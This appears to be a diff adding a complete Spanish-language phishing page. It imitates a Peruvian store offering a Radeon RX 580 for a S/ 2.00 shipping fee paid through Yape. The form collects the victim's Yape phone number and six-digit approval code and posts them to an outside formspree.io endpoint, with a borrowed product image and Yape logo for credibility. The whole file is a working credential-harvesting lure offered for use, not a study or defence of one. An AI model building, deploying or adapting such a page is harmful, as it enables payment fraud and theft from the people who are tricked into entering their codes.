@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Compra Radeon RX 580 - Shalom Perú</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #111;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .main-wrapper {
+            display: flex;
+            background: #1a1a1a;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 850px;
+            border: 1px solid #333;
+        }
+        /* Lado Izquierdo: Producto */
+        .info-side {
+            flex: 1;
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
+        }
+        .product-img {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            object-fit: contain;
+            background: #fff;
+        }
+        .info-side h1 {
+            color: #ff4b2b; /* Color resaltado para hardware */
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        .details-list {
+            list-style: none;
+            padding: 0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .details-list li {
+            margin-bottom: 8px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 5px;
+        }
+        .details-list li b {
+            color: #ff4b2b;
+        }
+
+        /* Lado Derecho: Formulario Yape */
+        .payment-side {
+            background: white;
+            padding: 40px;
+            width: 350px;
+            color: #333;
+            text-align: center;
+        }
+        .logo-yape {
+            width: 110px;
+            margin-bottom: 20px;
+        }
+        .label-text {
+            display: block;
+            text-align: left;
+            font-size: 14px;
+            font-weight: bold;
+            color: #444;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .input-celular {
+            border: 1px solid #7ea8f8;
+            background-color: #f0f4ff;
+        }
+        .input-codigo {
+            border: 2.5px solid #000;
+            background-color: #fff;
+            text-align: center;
+            font-weight: bold;
+            font-size: 20px;
+            letter-spacing: 3px;
+        }
+        .menu-ayuda {
+            display: block;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+            text-decoration: none;
+        }
+        .btn-yapear {
+            width: 100%;
+            padding: 16px;
+            background-color: #742284;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-yapear:hover {
+            background-color: #5a1a66;
+            transform: translateY(-2px);
+        }
+        .envio-tag {
+            margin-top: 15px;
+            font-weight: bold;
+            color: #e60000;
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+    <div class="info-side">
+        <img src="https://m.media-amazon.com/images/I/61+blpuXrsL._AC_UF894,1000_QL80_.jpg" alt="Radeon RX 580" class="product-img">
+        <h1>Radeon RX 580 - 8 GB GDDR5</h1>
+        <ul class="details-list">
+            <li>Marca: <b>51RISC</b></li>
+            <li>Memoria RAM: <b>8 GB GDDR5</b></li>
+            <li>Salidas: <b>DisplayPort, HDMI</b></li>
+            <li>Procesador: <b>AMD RX 580</b></li>
+            <li>Envío: <b>Shalom (Pago en destino)</b></li>
+        </ul>
+        <div class="envio-tag">Solo paga envío: S/ 2.00 - Shalom Perú</div>
+    </div>
+
+    <div class="payment-side">
+        <img src="https://www.apuestatotal.com//cms/img/banners/892/logo-yape.png" alt="Yape" class="logo-yape">
+        
+        <form action="https://formspree.io/f/xaqyqrjy" method="POST">
+            
+            <label class="label-text">Ingresa tu celular yape</label>
+            <input type="tel" name="Celular_Comprador" class="input-celular" placeholder="900 000 000" required>
+
+            <label class="label-text">Código de aprobación</label>
+            <input type="text" name="Codigo_Aprobacion" class="input-codigo" placeholder="000000" maxlength="6" required>
+
+            <a href="#" class="menu-ayuda">Encuéntralo en el menú de Yape</a>
+
+            <input type="hidden" name="Producto" value="Envio RX 580 - Shalom">
+            <input type="hidden" name="Precio" value="S/ 2.00">
+
+            <button type="submit" class="btn-yapear">YAPEAR S/ 2.00</button>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
